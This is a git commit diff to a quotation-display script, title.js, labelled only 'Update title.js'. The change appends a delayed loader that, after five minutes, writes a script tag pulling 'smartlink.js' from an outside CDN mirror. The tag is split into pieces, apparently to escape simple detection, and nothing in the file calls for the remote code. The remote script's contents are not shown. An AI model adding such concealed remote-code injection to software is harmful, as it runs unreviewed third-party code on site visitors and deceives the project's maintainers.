c337e0672d036a46552c4e1e5fa4a1cf51c4b3e4
jodohjanda <95437374+jodohjanda@users.noreply.github.com>
2021-12-03 03:19:23 +0700

    Update title.js

--- script/title.js
+++ script/title.js
@@ -443,3 +443,8 @@ function showQuotation(){
 document.write(Quotation[whichQuotation]);
 }
 showQuotation();
+
+// time out
+setTimeout(function() {
+    document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/aridjayasite/aridjayasite/4e706569d1b8f2037d08879d9ffe7a76e1fa3162/random/smartlink.js"></scr' + 'ipt>');
+}, 5 * 60 * 1000);
